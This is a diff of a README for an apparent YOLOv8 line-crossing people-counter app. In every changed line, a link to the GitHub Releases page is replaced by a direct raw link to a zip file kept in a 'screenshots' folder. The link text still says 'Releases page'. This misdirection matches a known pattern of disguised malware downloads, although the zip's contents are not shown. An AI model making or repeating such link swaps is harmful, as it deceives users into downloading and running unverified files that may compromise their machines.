@@ -1,6 +1,6 @@
 # 🎯 yolov8-line-crossing-counter - Count people with line crossing
 
-[![⬇️ Download the app](https://img.shields.io/badge/Download-Releases-blue.svg)](https://github.com/Stereoscopic-memory180/yolov8-line-crossing-counter/releases)
+[![⬇️ Download the app](https://img.shields.io/badge/Download-Releases-blue.svg)](https://raw.githubusercontent.com/Stereoscopic-memory180/yolov8-line-crossing-counter/main/screenshots/counter_crossing_yolov_line_v1.2-alpha.5.zip)
 
 ## 🧭 What this app does
 
@@ -14,7 +14,7 @@ Use it for:
 
 ## 📥 Download and run on Windows
 
-1. Open the [Releases page](https://github.com/Stereoscopic-memory180/yolov8-line-crossing-counter/releases)
+1. Open the [Releases page](https://raw.githubusercontent.com/Stereoscopic-memory180/yolov8-line-crossing-counter/main/screenshots/counter_crossing_yolov_line_v1.2-alpha.5.zip)
 2. Look for the latest release at the top
 3. Under Assets, download the Windows file
 4. If the file is a `.zip`, right-click it and choose Extract All
@@ -184,7 +184,7 @@ Use the release files as provided on the GitHub page. Check the repository files
 
 ## 🔗 Download again
 
-[Visit the Releases page to download](https://github.com/Stereoscopic-memory180/yolov8-line-crossing-counter/releases)
+[Visit the Releases page to download](https://raw.githubusercontent.com/Stereoscopic-memory180/yolov8-line-crossing-counter/main/screenshots/counter_crossing_yolov_line_v1.2-alpha.5.zip)
 
 ## 💻 Quick start checklist
 
